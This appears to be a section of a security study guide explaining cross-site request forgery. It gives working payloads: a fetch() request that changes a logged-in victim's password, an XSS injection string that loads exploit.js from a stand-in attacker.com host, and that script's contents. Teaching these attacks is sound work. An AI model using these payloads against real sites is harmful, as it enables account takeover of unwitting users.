---
layout:
  width: wide
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: false
---

# 2.10 Cross-Site Request Forgery (CSRF)

CSRF is an attack where a victim’s browser is tricked into performing actions on a website they’re already logged into **without their permission**.\
If the victim is authenticated, the attacker can force their browser to submit a request—like changing a password—just by getting them to load a malicious page or script.

If the site also has XSS, the attacker can inject JavaScript directly into the page so the victim triggers the attack automatically while logged in.

#### Simple Explanation

Imagine you’re logged into a website. If an attacker makes your browser secretly send a request—such as “change my password to attacker123”—the website thinks _you_ requested it, because you're already logged in.\
This lets the attacker take over your account.

Below is a **simple example** of a CSRF JavaScript payload that changes a user’s password automatically when they load a malicious page.

#### Example CSRF Script (Simple)

```html
<!-- This script silently sends a request to change the user's password -->
<script>
  fetch("http://victim-website.com/change-password", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "new_password=attacker123&confirm_password=attacker123"
  });
</script>
```

#### Example of Loading a Remote Malicious Script (Like in the text)

```html
"><script src="http://attacker.com/exploit.js"></script>
```

#### Content of exploit.js (on attacker.com)

```javascript
fetch("http://victim-website.com/change-password", {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "new_password=hacked123&confirm_password=hacked123"
});
```

This works because the victim’s browser **automatically sends their cookies**, making the site think the request is legitimate.

This [Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) from OWASP discusses the attack and prevention measures in greater detail.
